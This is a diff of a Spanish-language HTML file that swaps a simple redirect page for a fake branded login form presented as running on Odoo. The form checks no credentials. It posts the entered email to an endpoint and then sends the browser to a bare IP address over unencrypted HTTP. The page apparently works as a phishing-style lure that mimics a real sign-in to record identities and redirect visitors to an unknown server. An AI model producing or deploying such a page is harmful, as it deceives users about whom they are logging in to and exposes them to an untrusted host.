@@ -1,59 +1,220 @@
 <!doctype html>
 <html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="noindex">
-  <title>Cargando…</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="noindex" />
+  <title>Capacitaciones</title>
+  <script src="https://cdn.tailwindcss.com/3.4.16"></script>
   <style>
-    :root { --bg: #0f172a; --fg: #e2e8f0; --accent: #f59e0b; --track: #1e293b; }
-    * { box-sizing: border-box; margin: 0; }
-    body {
-      min-height: 100vh; display: grid; place-items: center;
-      background: var(--bg); color: var(--fg);
-      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-    }
-    .box { text-align: center; padding: 16px; }
-    .spinner {
-      width: 56px; height: 56px; margin: 0 auto 24px;
-      border: 5px solid var(--track); border-top-color: var(--accent);
-      border-radius: 50%; animation: spin 0.9s linear infinite;
-    }
-    h1 { font-size: 1.5rem; font-weight: 600; margin-bottom: 8px; }
-    p { opacity: .75; }
-    .bar { width: min(280px, 80vw); height: 6px; margin: 20px auto 0; background: var(--track); border-radius: 3px; overflow: hidden; }
-    .bar > div { height: 100%; width: 0; background: var(--accent); animation: fill var(--dur) linear forwards; }
-    a { color: var(--accent); }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes fill { to { width: 100%; } }
+    /* Toast mínimo (sustituye a react-hot-toast) */
+    #toast-root { position: fixed; top: 16px; left: 50%; transform: translateX(-50%); z-index: 50; display: flex; flex-direction: column; gap: 8px; align-items: center; }
+    .toast { background: #333; color: #fff; font-size: 13px; padding: 8px 14px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,.15); opacity: 0; transform: translateY(-8px); transition: opacity .2s, transform .2s; max-width: 90vw; }
+    .toast.show { opacity: 1; transform: translateY(0); }
+    .toast.error { background: #c0362c; }
   </style>
 </head>
 <body>
-  <main class="box">
-    <div class="spinner" aria-hidden="true"></div>
-    <h1>Cargando…</h1>
-    <p>Serás redirigido en <span id="count">4</span> segundos</p>
-    <div class="bar"><div></div></div>
-  </main>
+  <div id="toast-root"></div>
+
+  <div
+    class="relative isolate flex min-h-dvh flex-col items-center justify-center bg-[#cfc5dc] bg-cover bg-center px-4 py-8"
+    style="background-image: url('reforzamiento/fondo-login.webp')"
+  >
+    <!-- En modo oscuro se oscurece el fondo para que la tarjeta no quede sobre un fondo claro. -->
+    <div aria-hidden class="absolute inset-0 -z-10 hidden bg-zinc-950/75 dark:block"></div>
+
+    <!-- Tarjeta principal del Login -->
+    <main class="w-full max-w-[390px] rounded-md bg-white px-7 py-9 shadow-sm dark:bg-zinc-900">
+      <!-- Logo -->
+      <div class="mb-8 flex flex-col items-center justify-center">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 406.86" class="w-full max-w-[210px] text-gray-800 dark:text-white/90" aria-label="PD logo">
+          <g fill="currentColor">
+            <polygon points="441.63 141.83 441.63 158.22 441.63 193.35 441.63 209.22 441.63 238.62 459.32 238.62 459.32 209.22 488.2 209.22 488.2 193.35 459.32 193.35 459.32 158.22 493.14 158.22 493.14 141.83 441.63 141.83" />
+            <rect x="441.63" y="243.82" width="51.51" height="17.17" />
+          </g>
+          <path fill="currentColor" d="M789.77,142.61h8.55v109.33c0,4.85-3.94,8.79-8.79,8.79h-8.13v-109.76c0-4.61,3.74-8.36,8.36-8.36Z" />
+          <path fill="#921915" d="M240.43,19.55l90.89,92.1-62.44,62.96-61.69-61.34c-16.82-16.73-16.97-43.9-.34-60.82l33.58-32.91Z" />
+          <path fill="#bd484a" d="M268.66,174.87l90.89,92.1-62.44,62.96-61.69-61.34c-16.82-16.73-16.97-43.9-.34-60.82l33.58-32.91Z" />
+          <path fill="#a11e1f" d="M359.79,266.76l-90.81-92.17,62.49-62.91,61.64,61.39c16.81,16.74,16.94,43.92.29,60.82l-33.61,32.88Z" />
+          <g>
+            <path fill="#14559c" d="M211.55,387.3l-90.89-92.1,62.44-62.96,61.69,61.34c16.82,16.73,16.97,43.9.34,60.82l-33.58,32.91Z" />
+            <path fill="#259dd7" d="M183.32,231.98l-90.89-92.1,62.44-62.96,61.69,61.34c16.82,16.73,16.97,43.9.34,60.82l-33.58,32.91Z" />
+            <path fill="#1177b7" d="M92.2,140.1l90.81,92.17-62.49,62.91-61.64-61.39c-16.81-16.74-16.94-43.92-.29-60.82l33.61-32.88Z" />
+          </g>
+          <g fill="currentColor">
+            <polygon points="577.24 141.7 577.24 158.09 577.24 193.22 577.24 209.09 577.24 238.49 594.93 238.49 594.93 209.09 623.81 209.09 623.81 193.22 594.93 193.22 594.93 158.09 628.76 158.09 628.76 141.7 577.24 141.7" />
+            <rect x="577.24" y="243.69" width="51.51" height="17.17" />
+          </g>
+          <path fill="currentColor" d="M555.19,142.03c-5.39,0-9.76,4.37-9.76,9.76v61.47l-25.56-71.55h-17.17v119.29h7.41c5.39,0,9.76-4.37,9.76-9.76v-61.47l25.56,71.55h17.17v-119.29h-7.41Z" />
+          <polygon fill="currentColor" points="857.05 260.73 874.23 260.73 847.69 141.7 833.83 141.7 817.44 214.16 833.25 213.97 840.47 176.5 848.86 219.1 831.88 219.1 816.27 219.1 812.63 235.23 812.72 235.23 807.1 260.73 824.08 260.73 828.86 235.23 852.03 235.23 857.05 260.73" />
+          <path fill="currentColor" d="M787.78,138.26h8.61c1.58,0,3.08-.64,4.17-1.78l20.58-21.44h-12c-3.93,0-7.59,1.99-9.73,5.29l-11.64,17.93Z" />
+          <path fill="currentColor" d="M1006.57,141.7h-28.21v98.86h17.17v-81.22l8.94-.09c6.47-.07,11.75,5.17,11.74,11.64l-.11,59.37c-.01,7.49-6.09,13.55-13.58,13.54l-24.17-.03v17.02h27.88c14.85,0,26.92-11.97,27.04-26.82l.53-64.8c.12-15.13-12.11-27.47-27.24-27.47Z" />
+          <path fill="currentColor" d="M966.35,169.41c-.12-15.34-12.59-27.71-27.93-27.71h-27.51v119.09h7.32c5.33,0,9.66-4.32,9.66-9.66v-35.58h11.03c15.32-.02,27.7-12.51,27.58-27.84l-.15-18.3ZM938.14,198.61l-10.26.05v-39.74l11.59.12c5.59.06,10.1,4.59,10.12,10.18l.09,17.74c.03,6.41-5.13,11.62-11.54,11.66Z" />
+          <path fill="currentColor" d="M511.78,291.92c-1.69-2.43-4.18-2.88-7.26-2.88-1.6,0-5.12.4-7.86,4.72v-4.22h-7.41v34.29h7.41v-23.97c.22-2.59,1.15-5.34,4.39-5.4,5.87-.11,4.88,6.34,4.88,8.39v20.98h7.43v-20.81c0-4.45.12-8.66-1.58-11.09Z" />
+          <path fill="currentColor" d="M555.2,282.46l6.25-10.17,5.72,2.99-8.17,9.32-3.8-2.14ZM554.38,289.53h7.64v34.29h-7.64v-34.29Z" />
+          <path fill="currentColor" d="M609.7,295.66c-.77-2.17-1.89-3.82-3.36-4.94-1.47-1.12-3.25-1.68-5.32-1.68-1.8,0-3.43.61-4.91,1.82-1.39,1.15-2.53,2.76-3.41,4.82,0,0,0,0,0-.01-.75-2.17-1.85-3.82-3.29-4.94-1.45-1.12-3.18-1.68-5.2-1.68-1.74,0-3.29.56-4.64,1.67-1.07.88-1.98,2.08-2.75,3.57v-4.74h-6.64v34.29h6.64v-21.21c0-1.92.44-3.4,1.33-4.44.89-1.05,2.15-1.57,3.78-1.57s2.99.6,3.9,1.8c.92,1.2,1.38,2.91,1.38,5.14v20.28h6.61v-20.32c0-.1,0-.19,0-.28v.05c0-2.14.45-3.78,1.33-4.94.88-1.16,2.13-1.73,3.74-1.73,1.7,0,3.02.6,3.95,1.8.93,1.2,1.39,2.91,1.39,5.14v20.28h6.64v-20.32c0-3.06-.39-5.68-1.15-7.85Z" />
+          <path fill="currentColor" d="M659.1,313.77c-.18-.72-.23-3.14-.19-5.87l17.25-.08c0-3.86-.47-7.61-1.4-10.35-.94-2.74-2.29-4.83-4.08-6.27-1.78-1.44-5.89-1.77-8.4-1.69-6.31.21-8.22,4.42-9.21,6.78-.99,2.37-1.48,5.22-1.49,8.57,0,5.3.33,13.82,4.68,16.81,3.12,2.15,5.71,2.15,8.49,2.15,1.89,0,3.76-.44,5.62-1.32,1.86-.88,5.11-3.66,5.21-10.48h-6.83c.59,7.61-7.88,8.91-9.66,1.76ZM663.88,294.75c3.83.24,4.2,6.46,4.39,8.82l-9.24.24c.11-2.59.29-4.85.48-5.54.75-2.64,2.32-3.65,4.36-3.52Z" />
+          <g fill="currentColor">
+            <rect x="472.85" y="289.53" width="8.2" height="34.29" />
+            <ellipse cx="476.85" cy="279.43" rx="5.17" ry="4.59" />
+          </g>
+          <g fill="currentColor">
+            <rect x="618.1" y="289.73" width="8.2" height="34.29" />
+            <ellipse cx="622.1" cy="279.63" rx="5.17" ry="4.59" />
+          </g>
+          <polygon fill="currentColor" points="647.42 289.53 643.19 289.53 643.19 279.63 635.78 279.63 635.78 289.53 631.68 289.53 631.68 294.36 635.78 294.36 635.78 323.82 643.19 323.82 643.19 294.36 647.42 294.36 647.42 289.53" />
+          <path fill="currentColor" d="M698.22,290.94v5.76s-5.27-3.22-8.98-.88c-3.71,2.34.1,6.63,3.71,8.39s9.48,6.36,7.02,13.17c-2.54,7.02-11.02,7.51-17.85,4.88v-6.15s5.17,4.2,9.56,1.17c4.39-3.02-1.07-8.2-4.1-9.56-3.24-1.47-8.78-6-6.73-11.61,2.18-5.96,8.78-8.39,17.37-5.17Z" />
+          <rect fill="currentColor" x="537.89" y="269.87" width="7.93" height="53.95" />
+          <path fill="currentColor" d="M464.85,271.53l-.1,6.93s-9.83-5.27-13.35.98c-3.52,6.24,2.24,10.12,6.23,13.85,4.59,4.29,13.28,10.42,9.56,20.98-3.61,10.24-14.01,11.39-22.93,7.25v-7.54s7.94,6.57,13.08,1.17c5.76-6.05.2-12.59-7.51-18.34-5.75-4.29-9.7-10.46-6.87-18.46,2.83-8,12.17-10.52,21.9-6.81Z" />
+          <path fill="currentColor" d="M765.54,176.84s1.56-12.05-1.95-18.09c-3.51-6.05-11.32-17.43-26.93-16.13-15.61,1.3-25.37,8.72-27.51,24.33v1.95h-.85v66.34h.85v.78c1.06,14.6,13.2,26.08,27.71,26.34,14.72.26,27.38-11.11,28.68-25.91v-40.5h-30.18v14.83h13.2v24.46c-.91,5.64-5.84,9.8-11.51,9.76-5.6-.05-10.42-4.19-11.32-9.76v-66.34c1.53-6.03,7.15-9.96,12.88-9.37,4.91.51,9.11,4.27,10.34,9.37-.07,2.65-.13,5.3-.2,7.95h16.78Z" />
+          <path fill="currentColor" d="M699.98,260.86l-17.94-53.94c19.87-10.51,13.89-37.23,13.89-37.23-.13-15.34-12.85-27.71-28.51-27.71h-28.07v119.09h6.2c5.44,0,11.13-4.32,11.13-9.66v-40.63h9.7l15.47,50.08h18.15ZM655.88,195.04v-36.94l12.24.12c5.9.06,10.67,4.61,10.7,10.23l.07,13.92c.03,6.44-2.33,12.68-12.31,12.68h-10.7Z" />
+        </svg>
+      </div>
+
+      <form id="login-form" class="space-y-4" novalidate>
+        <!-- Campo Correo Electrónico -->
+        <div>
+          <div class="mb-1.5 flex items-center justify-between text-xs">
+            <label for="email" class="font-semibold text-gray-800 dark:text-gray-200">Correo electrónico</label>
+            <button type="button" data-toast="Seleccionar usuario" class="font-medium text-[#7A5970] hover:underline dark:text-[#b58da9]">Elija un usuario</button>
+          </div>
+          <input
+            id="email"
+            type="email"
+            placeholder="usuario@tuempresa.com"
+            class="w-full rounded border border-gray-200 bg-[#EDF2FA] px-3 py-2 text-sm text-gray-900 placeholder-gray-400 transition-colors focus:border-[#6B4C62] focus:bg-white focus:outline-none dark:border-zinc-700 dark:bg-zinc-800 dark:text-white"
+          />
+        </div>
+
+        <!-- Campo Contraseña -->
+        <div>
+          <div class="mb-1.5 flex items-center justify-between text-xs">
+            <label for="password" class="font-semibold text-gray-800 dark:text-gray-200">Contraseña</label>
+            <button type="button" data-toast="Recuperación de contraseña" class="font-medium text-[#7A5970] hover:underline dark:text-[#b58da9]">Restablecer contraseña</button>
+          </div>
+          <div class="relative flex items-center">
+            <input
+              id="password"
+              type="password"
+              placeholder="••••"
+              class="w-full rounded border border-gray-200 bg-[#EDF2FA] py-3 pr-12 pl-3 text-sm text-gray-900 placeholder-gray-400 transition-colors focus:border-[#6B4C62] focus:bg-white focus:outline-none dark:border-zinc-700 dark:bg-zinc-800 dark:text-white"
+            />
+            <button
+              type="button"
+              id="toggle-password"
+              class="absolute right-1.5 flex size-7 items-center justify-center rounded border border-gray-200 bg-white text-gray-600 shadow-sm hover:text-gray-900"
+              aria-label="Mostrar u ocultar contraseña"
+            >
+              <!-- icono ojo (se intercambia por JS) -->
+              <svg data-icon="eye" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"/><circle cx="12" cy="12" r="3"/></svg>
+              <svg data-icon="eye-off" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden size-4"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"/><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"/><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"/><path d="m2 2 20 20"/></svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- Botón Principal -->
+        <div class="pt-2">
+          <button
+            type="submit"
+            id="submit-btn"
+            class="w-full cursor-pointer rounded bg-[#6B4C62] px-4 py-2.5 text-sm font-medium text-white transition-colors hover:bg-[#583e50] active:bg-[#493242] disabled:cursor-not-allowed disabled:opacity-60"
+          >
+            Iniciar sesión
+          </button>
+        </div>
+      </form>
+
+      <!-- Enlace de registro -->
+      <div class="mt-4 text-center">
+        <button type="button" data-toast="Formulario de registro" class="text-xs font-medium text-[#7A5970] hover:underline dark:text-[#b58da9]">¿No tienes una cuenta?</button>
+      </div>
+
+      <!-- Separador -->
+      <div class="my-4 flex items-center justify-center gap-2 text-xs text-gray-400">
+        <span>- o -</span>
+      </div>
+
+      <!-- Botón secundario: Llave de acceso -->
+      <button
+        type="button"
+        data-toast="Autenticación con Passkey"
+        class="flex w-full cursor-pointer items-center justify-start gap-2.5 rounded border border-gray-200 bg-white px-4 py-2 text-xs font-medium text-gray-700 transition-colors hover:bg-gray-50 dark:border-zinc-700 dark:bg-zinc-800 dark:text-gray-200 dark:hover:bg-zinc-700"
+      >
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 text-gray-600 dark:text-gray-300"><rect width="5" height="5" x="3" y="3" rx="1"/><rect width="5" height="5" x="16" y="3" rx="1"/><rect width="5" height="5" x="3" y="16" rx="1"/><path d="M21 16h-3a2 2 0 0 0-2 2v3"/><path d="M21 21v.01"/><path d="M12 7v3a2 2 0 0 1-2 2H7"/><path d="M3 12h.01"/><path d="M12 3h.01"/><path d="M12 16v.01"/><path d="M16 12h1"/><path d="M21 12v.01"/><path d="M12 21v-1"/></svg>
+        <span>Usa una llave de acceso</span>
+      </button>
+
+      <!-- Pie de tarjeta -->
+      <div class="mt-7 text-center">
+        <p class="text-[11px] text-gray-400">
+          Con la tecnología de
+          <span class="font-medium text-[#7A5970] dark:text-[#b58da9]">Odoo</span>
+        </p>
+      </div>
+    </main>
+  </div>
 
   <script>
-    // ⚙️ Configura aquí el destino y la duración
-    const REDIRECT_URL = "https://reforzamiento.energiapd.com";
-    const SECONDS = 4;
+    // Suite privada a la que se redirige tras registrar el acceso.
+    const URL_SUITE_PRIVADA = 'http://89.167.20.163:8080';
 
-    document.documentElement.style.setProperty("--dur", SECONDS + "s");
-    const countEl = document.getElementById("count");
-    let left = SECONDS;
-    countEl.textContent = left;
+    // --- Toast mínimo ---
+    const toastRoot = document.getElementById('toast-root');
+    function toast(msg, isError) {
+      const el = document.createElement('div');
+      el.className = 'toast' + (isError ? ' error' : '');
+      el.textContent = msg;
+      toastRoot.appendChild(el);
+      requestAnimationFrame(() => el.classList.add('show'));
+      setTimeout(() => {
+        el.classList.remove('show');
+        setTimeout(() => el.remove(), 250);
+      }, 2500);
+    }
 
-    const tick = setInterval(() => {
-      left--;
-      countEl.textContent = Math.max(left, 0);
-      if (left <= 0) {
-        clearInterval(tick);
-        window.location.replace(REDIRECT_URL);
+    // Botones informativos (igual que los toast del original)
+    document.querySelectorAll('[data-toast]').forEach((b) =>
+      b.addEventListener('click', () => toast(b.dataset.toast))
+    );
+
+    // Mostrar / ocultar contraseña
+    const passwordInput = document.getElementById('password');
+    const eye = document.querySelector('[data-icon="eye"]');
+    const eyeOff = document.querySelector('[data-icon="eye-off"]');
+    document.getElementById('toggle-password').addEventListener('click', () => {
+      const show = passwordInput.type === 'password';
+      passwordInput.type = show ? 'text' : 'password';
+      eye.classList.toggle('hidden', show);
+      eyeOff.classList.toggle('hidden', !show);
+    });
+
+    // Envío del formulario
+    const form = document.getElementById('login-form');
+    const submitBtn = document.getElementById('submit-btn');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = passwordInput.value;
+      if (!email || !password) {
+        toast('Por favor ingresa tus credenciales', true);
+        return;
       }
-    }, 1000);
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Iniciando sesión…';
+      // Registra el acceso (solo el identificador + fecha/hora) para que la suite
+      // privada lo sincronice. La contraseña NO se envía. Un fallo no bloquea el acceso.
+      try {
+        await fetch('/api/v1/reforzamiento/acceso', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ identificador: email }),
+        });
+      } catch {
+        /* "mejor esfuerzo"; continuamos al privado */
+      }
+      window.location.href = URL_SUITE_PRIVADA;
+    });
   </script>
 </body>
 </html>
